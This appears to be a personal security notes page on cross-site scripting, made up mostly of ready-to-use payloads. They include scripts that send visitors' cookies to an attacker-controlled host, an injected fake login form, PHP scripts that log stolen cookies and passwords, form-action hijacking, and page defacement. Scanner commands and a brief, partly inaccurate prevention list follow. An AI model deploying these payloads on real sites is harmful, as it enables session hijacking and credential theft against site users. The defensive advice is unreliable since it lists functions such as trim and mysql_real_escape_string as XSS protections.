---
layout: default
title: XSS
nav_order: 2 
parent: security stuff
permalink: /notes/security-stuff/xss
---

1. TOC
{:toc}

---

## XSS Examples
### Simple Alert Box
```js
<script>alert('attacked')</script>
```




### Cookie Stealing
> #### **_example one_**
```js
<script>document.location="http://localhost/cookie.php?q="+document.cookie;</script>
```
> #### **_example two_**
```html
<a href="javascript:document.location='http://localhost/cookie.php?q='+document.cookie;">CLICK ME!</a>
```
>> *cookie.php could look like this:*
```php
<?php
$file = "cookie.txt"
$act = fopen($file, 'a');
$cookie = $_GET['q'];
fwrite($act,$cookie);
fclose($act);
?>
```

> #### **_other examples_**
```js
<script>new image().src="http://<attacker's IP Address>/b.php?"+document.cookie;</script>
<script>new Image().src="http://111.11.11.11/"+encodeURI(document.cookie)</script>
<script>$.post("http://111.11.11.11", {cookie:document.cookie})</script>
```




### Phishing 
> #### **_example one_**

> ```html
> <form name ="phish" action="http://localhost/phish.php" method="post">
> <br><br><hr>
> <h3>Login now:</h3><br><br>
> Enter Username: <br><input type="text" name="email"><br><Enter Password:<br><input type="password" name="pass"><br> 
> <input type="submit" name="Login" value="Login">
> </form>
> <br><br><hr>
> ```

>> *phish.php could look like this:*
```php
<?php
$file = fopen('phished.txt', 'a');
$fwrite($file, 'Email = ' . $_POST['email'] . PHP_EOL);
$fwrite($file, 'Pass = ' . $_POST['pass'] . PHP_EOL . PHP_EOL);
fclose($file);
header("Location: http://exapmle.com/xss.html");
die();
?>
```

> #### **_example two_**
*In this case, the page will remain completely unchanged. SSL will not help the victim either.*
```js
forms[0].action.value="http://hackersite.com/phish.cgi";
```




### Stored XSS -> Image onmouseover
```js
<IMG SRC=# onmouseover="alert(document.cookie)">
```

### Call a script from an external source
```js
<script>document.write('<script src=http://example.com/xss.js></script>')</script>
```

### Post data to form
```js
<script>$.post("<http form>", {parameter: "<value>"})</script>
```

### DOM Deface
```html
# deface with image
document.body.innerHTML="<img src="#" height="500%" width="700%" ></img>";
```

---

## Tool scanning for XSS vulnerabilities

### ARACHNI: <https://www.arachni-scanner.com/>

### NMAP: (NSE scripts: http-dombased-xss , http-stored-xss , http-phpself-xss)
```bash
nmap -p80 --script http-stored-xss.nse --script-args=httpspider,maxpagecount=200 <target-host>
```

### XSSER
```bash
xsser -c100 --Cw=4 -U <target-host>
c : number of pages to crawl
--Cw : depth of crawler 
-u : URL
```

---

## Securing your code / preventing XSS
Listed below are some common functions used to prevent XSS 
- asp.net: `AntiXss.htmlencode()`
- javascript: `AntiXSS.JavascriptEncode()`
- php: `htmlentities()` , `htmlspecialchars()` , `trim()` , `stripslashes()` , `mysql_real_escape_string()` , [more](https://www.w3schools.com/pHp/php_ref_string.asp)  

---

## Resources / More 
### Links  
#### Cheatsheets and more
[XSS Filter Evasion Cheat Sheet from OWASP](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)  
[xss payloads cheatsheet](https://xsses.rocks/sample-page/)  
[collection of xss payloads, tools and reference](http://www.xss-payloads.com/)  
[bypassing XSS filtering by s0md3v](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)  
#### Tools
[XSS Fuzzer](https://github.com/NytroRST/XSSFuzzer)  
[xcampo](https://github.com/plaguna/xcampo)  
#### wordlists
[a payloads.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  
[another payloads.txt](https://github.com/atulgrayhat/xss-custom-payload/blob/master/xss-payloads.txt)  







